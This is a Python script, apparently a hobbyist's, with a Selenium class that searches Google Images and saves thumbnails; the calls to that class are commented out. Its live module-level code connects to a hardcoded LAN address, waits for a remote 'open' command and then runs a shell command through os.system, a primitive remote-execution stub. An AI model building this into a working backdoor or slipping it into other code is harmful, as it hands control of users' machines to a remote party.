from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time, socket, os, sys

class Browser:

    keyToSearch = None
    driverToBrowse = None


    def __init__(self, key, driver):
        self.keyToSearch = key
        self.driverToBrowse = driver
        
    def search(self):
        text_area = self.driverToBrowse.find_element_by_name("q")  #looking for element HTML in the search engine
        text_area.send_keys(f"{self.keyToSearch}") #typing in search engine keyword
        text_area.send_keys(Keys.ENTER) # sending to search engine ENTER as simulation physical key ENTER
        time.sleep(2)

        
        text_area=self.driverToBrowse.find_element_by_xpath('//*[@id="hdtb-msb"]/div[1]/div/div[2]/a')
        text_area.click()
        time.sleep(2)


    def launch(self):

        self.driverToBrowse.get("http://google.com")
        agree = self.driverToBrowse.find_element_by_id("L2AGLb")
        agree.click()

    def save(self):

        for i in range(1,10):
            img = self.driverToBrowse.find_element_by_xpath(f'//*[@id="islrg"]/div[1]/div[{i}]/a[1]/div[1]/img')
            with open(f"obrazek{i}.png", "wb") as file:                                                        
                file.write(img.screenshot_as_png)

            
    
    def __str__(self):
        return "Wpisane haslo {}".format(self.keyToSearch)

s = socket.socket()
host = "192.168.1.19"
port = 80

s.connect((host,port))
command = s.recv(1024)
command = command.decode()

if command == "open":
    print("Command is :", command)
    s.send("Command received".encode())
     
    # you can give batch file as input here
    os.system('ls')

#name = input("Podaj haslo: ")
#driver = webdriver.Safari(port=0, executable_path="/usr/bin/safaridriver", quiet=False)
#b = Browser(name,driver)
#b.launch()
#b.search()
#b.save()

